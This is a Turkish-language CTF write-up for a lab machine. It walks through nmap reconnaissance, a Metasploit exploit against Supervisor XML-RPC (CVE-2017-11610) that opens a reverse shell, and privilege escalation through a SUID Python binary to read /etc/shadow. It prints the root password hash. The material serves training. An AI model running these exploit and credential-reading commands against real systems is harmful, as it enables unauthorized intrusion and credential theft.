# Super Process - CTF Writeup

## Çözüm Özeti
- **Hedef IP:** `172.20.5.30`
- **İşletim Sistemi:** Linux (Debian)
- **Kullanılan Zafiyetler:** Supervisor XML-RPC Remote Code Execution (`CVE-2017-11610`), SUID Python 2.7 İle Yetki Yükseltme (Privilege Escalation)

---

## 1. Keşif Aşaması (Reconnaissance)

İlk aşamada hedef sistem üzerindeki açık portları ve çalışan servisleri tespit etmek amacıyla Nmap taraması gerçekleştirilmiştir:

```bash
nmap -sC -sV -T4 172.20.5.30
```

<img width="1649" height="618" alt="1" src="https://github.com/user-attachments/assets/1b87c584-773f-43ba-b6d4-e6fc4bb074b8" />


Taramada tespit edilen açık portlar:
- **22/tcp:** SSH (OpenSSH 8.4p1 Debian)
- **9001/tcp:** HTTP - Medusa httpd 1.12 (Supervisor process manager)

Daha detaylı analiz için `9001` portuna özel versiyon taraması yapılmıştır:

```bash
nmap -p 9001 -sC -sV -T4 172.20.5.30
```

<img width="1642" height="403" alt="2" src="https://github.com/user-attachments/assets/ee6c00e8-86a9-4559-aa23-29600578b7f5" />


Tarama sonucunda 9001 portunda **Supervisor Process Manager** web arayüzünün çalıştığı doğrulanmıştır. Tarayıcı üzerinden `http://172.20.5.30:9001` adresine gidildiğinde Supervisor kontrol paneline ulaşılmıştır:

<img width="845" height="248" alt="3" src="https://github.com/user-attachments/assets/ec6420c7-0d24-44e0-ba85-96fe3f7b3f19" />


---

## 2. İstismar Aşaması (Exploitation)

Supervisor servisinin bilinen zafiyetlerini araştırmak amacıyla Metasploit Framework (`msfconsole`) üzerinde arama yapılmıştır:

```bash
msfconsole
msf > search supervisor
```

<img width="1911" height="693" alt="4" src="https://github.com/user-attachments/assets/adb9c6da-5929-4a06-8dc6-a58bbbce6218" />


Arama sonucunda `exploit/linux/http/supervisor_xmlrpc_exec` modülü tespit edilmiştir. Bu modül, Supervisor servisinin XML-RPC arayüzündeki yetkisiz/yetkili RCE (Remote Code Execution) zafiyetini sömürerek komut çalıştırmaya imkan tanır.

Exploit modülü seçilip gerekli `RHOSTS` ve `LHOST` parametreleri yapılandırılmıştır:

```bash
use exploit/linux/http/supervisor_xmlrpc_exec
set rhosts 172.20.5.30
set lhost 10.8.136.22
exploit -j -z
```

<img width="1902" height="524" alt="5" src="https://github.com/user-attachments/assets/ef2561c2-0f90-4d2d-a4ae-bfb7c833dd24" />


Zafiyetli XML-RPC endpoint'ine (`172.20.5.30:9001/RPC2`) gönderilen payload ile hedef sistem üzerinde ilk erişim (shell) başarıyla elde edilmiştir.

---

## 3. Yetki Yükseltme Aşaması (Privilege Escalation)

Sistem içerisinde yetki yükseltme (Privilege Escalation) vektörlerini tespit etmek için SUID biti atanmış dosyalar taranmıştır:

```bash
find / -perm -u=s -type f 2>/dev/null
```

<img width="1209" height="404" alt="7" src="https://github.com/user-attachments/assets/bd3cbf5f-3b1f-434c-9fdd-c147b5293400" />


Yapılan incelemede standart sistem araçlarının yanında `/usr/bin/python2.7` ikili dosyasının üzerinde SUID bitinin aktif olduğu (`-rwsr-xr-x`) görülmüştür.

GTFOBins referans kataloğu incelendiğinde, SUID yetkisine sahip bir Python ortamıyla sistemdeki hassas dosyaların okunabileceği veya yetkili kabuk açılabileceği doğrulanmıştır:

<img width="1072" height="291" alt="8" src="https://github.com/user-attachments/assets/3e57f491-efc3-4772-9c95-1eae1883a4d4" />


Python SUID yetkisi kullanılarak yetkili kullanıcı dosyası olan `/etc/shadow` okunmuştur:

```bash
python -c 'print(open("/etc/shadow").read())'
```

<img width="1750" height="79" alt="9" src="https://github.com/user-attachments/assets/698d0e7f-04b1-4e32-a342-bda6f9653164" />


Elde edilen `root` kullanıcısına ait parola hash değeri:

```text
root:$y$j9T$e8KohoZuo9Aaj1SpH7/pm1$mu9eKYYcNlRPCJ51dW8d71.aPH0ceBM0AKxAaiil7C5:19640:0:99999:7:::
```

Bu hash kırılabilir ya da Python SUID yetkisi üzerinden doğrudan root kabuğu alınarak makine tamamlanabilir.
